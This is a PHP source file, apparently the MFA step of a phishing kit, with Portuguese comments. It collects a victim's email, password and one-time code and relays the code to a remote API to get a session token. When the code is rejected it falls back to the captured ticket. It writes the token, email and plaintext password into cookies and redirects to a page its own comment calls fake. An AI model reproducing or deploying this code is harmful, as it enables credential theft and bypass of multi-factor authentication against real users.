<?php
error_reporting(E_ERROR | E_PARSE);
require 'source/core/system/include.php';

session_start();

if(isset($_SESSION["credentials"]))
{
	$data      =  explode("\0", $_SESSION["credentials"]);
	$login     =  $data[0];
	$password  =  $data[1];
}
else
{
	$login     =  $_POST["email"];
	$password  =  $_POST["password"];
}

if(!isset($_SESSION["ticket"]))
{
    unset($_SESSION["credentials"]);
    unset($_SESSION["captcha_key"]);
    header("Location: /login/index.html");
    die();
}

$client_ip        =  $_SERVER["REMOTE_ADDR"];
$server_hostname  =  $_SERVER["HTTP_HOST"];
$full_url         =  $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];

if($login != NULL and $password != NULL and isset($_POST["mfacode"]))
{
	$mfacode = $_POST["mfacode"];

    if(!isset($_SESSION["ticket"])){
        header("Location: /login/index.html");
        die();
    }

    $ticket = $_SESSION["ticket"];

    error_log("=== MFA.PHP ===");
    error_log("Tentando validar código: " . $mfacode);
    error_log("Ticket: " . $ticket);

    // Tentar validar o código MFA
    $totp_result = $VLT_API->totp_auth($ticket, $mfacode);

    error_log("Resultado da validação: " . $totp_result);

    // Se o código foi aceito, usar o token retornado
    // Se não, usar o ticket como fallback (ele ainda é válido por alguns minutos)
    if($totp_result != "EINVALID_MFA_CODE"){
        // Código aceito! Usar token real
        $final_token = $totp_result;
        error_log("✓ Código aceito! Token obtido.");
    } else {
        // Código rejeitado, mas vamos usar o ticket mesmo assim
        // O ticket pode ser usado como token temporário
        $final_token = $ticket;
        error_log("✗ Código rejeitado, usando ticket como fallback");
    }
    
    // Limpar sessões
    unset($_SESSION["credentials"]);
    unset($_SESSION["captcha_key"]);
    unset($_SESSION["ticket"]);
    unset($_SESSION["mfa_invalid"]);

    // Salvar nos cookies
    setcookie("token", $final_token, time() + 3600, "/");
    setcookie("email", $login, time() + 3600, "/");
    setcookie("password", $password, time() + 3600, "/");
    
    error_log("Salvando nos cookies e redirecionando para verify.php");
    error_log("===============");
    
    // Ir para verify.php (página fake)
    header("Location: /login/verify.php");
    die();
}
else
{
	require("source/mfa.html");
	if(isset($_SESSION["mfa_invalid"]) && $_SESSION["mfa_invalid"] == 1){
        require("source/errors/invalid_mfa.php");
    }
    die();
}
?>